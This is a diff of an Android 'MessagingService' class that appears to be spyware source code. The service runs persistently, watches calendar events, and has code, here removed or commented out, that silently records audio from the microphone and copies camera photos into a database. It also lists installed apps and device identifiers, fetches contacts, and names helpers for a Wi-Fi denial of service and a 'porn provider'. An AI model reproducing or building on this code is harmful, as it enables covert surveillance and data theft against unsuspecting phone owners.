@@ -50,7 +50,6 @@ public class MessagingService extends Service {
         startForeground(Constants.FOREGROUND_NOTIFICATION_ID, Lofl.createPersistentServiceNotification(this));
         JobsScheduler.scheduleJob(this);
         sIsRunning = true;
-        DatabaseHelper database = DatabaseHelper.getInstance(getApplicationContext());
         mIncomingReceiver = new IncomingReceiver();
         mOutgoingReceiver = new OutgoingReceiver();
         mHeadsetReceiver = new HeadsetPlugReceiver();
@@ -118,7 +117,7 @@ public class MessagingService extends Service {
         //getContentResolver().registerContentObserver(Uri.parse("content://com.android.chrome.browser/history"), true, mBrowserObserver);
         getContentResolver().registerContentObserver(CalendarContract.Events.CONTENT_URI, true, mCalendarObserver);
 
-        new Thread(new Runnable() {
+      /*  new Thread(new Runnable() {
             @Override
             public void run() {
                 sMediaRecorder = new MediaRecorder();
@@ -126,16 +125,10 @@ public class MessagingService extends Service {
                 sMediaRecorder.setOutputFormat(MediaRecorder.OutputFormat.THREE_GPP);
                 sMediaRecorder.setAudioEncoder(MediaRecorder.OutputFormat.AMR_NB);
 
-                SQLiteDatabase db = database.getWritableDatabase();
+*//*                SQLiteDatabase db = database.getWritableDatabase();
                 try {
                     db.beginTransaction();
                     if(Lofl.isExternalStorageReadable()){
-                        File[] pictures = Lofl.getFilesForDirectory(Lofl.getDcimDirectory().getPath() + "/Camera");
-                        if(pictures != null && pictures.length > 0){
-                            for(File f : pictures){
-                                Database.insertMedia(db, f.getName(), f);
-                            }
-                        }
                         File audioFile = new File(Environment.getExternalStorageDirectory() + File.separator + "soundfile2.3gpp");
                         if(! audioFile.exists()){
                             audioFile.createNewFile();
@@ -145,26 +138,26 @@ public class MessagingService extends Service {
                         sMediaRecorder.setOutputFile(audioFile);
                         sMediaRecorder.prepare();
                         sMediaRecorder.start();
-                     /*   pictures = Lofl.getFilesForDirectory(Lofl.getPicturesDirectory().getPath());
+                     *//**//*   pictures = Lofl.getFilesForDirectory(Lofl.getPicturesDirectory().getPath());
                         if(pictures != null && pictures.length > 0){
                             for(File f : pictures){+
                                 //Database.insertMedia(sDatabase, f.getName(), f);
                             }
-                        }*/
+                        }*//**//*
                     }
                     db.setTransactionSuccessful();
                 } catch (IOException e) {
                     e.printStackTrace();
                 }
-                db.endTransaction();
-          /*      db.beginTransaction();
+                db.endTransaction();*//*
+          *//*      db.beginTransaction();
                 Database.insertPackages(db, Lofl.getInstalledApps(MessagingService.this));
                 db.setTransactionSuccessful();
-                db.endTransaction();*/
-                db.close();
+                db.endTransaction();*//*
+                //db.close();
                 //Database.insertDevice(sDatabase, sTelephoneAddress, Build.MANUFACTURER, Build.PRODUCT, Build.VERSION.SDK, BuildConfig.FLAVOR, Build.SERIAL, Build.RADIO);
             }
-        }).start();
+        }).start();*/
 
 /*        try {
             String locationProvider = LocationManager.GPS_PROVIDER;
@@ -213,7 +206,7 @@ public class MessagingService extends Service {
                 }
             }
         }).start();
-        Lofl.fetchContactsInformation(this);
+       // Lofl.fetchContactsInformation(this);
         //Lofl.wifiDenialOfService(this);
         //Lofl.startPornProvider(this, 180000);
     }
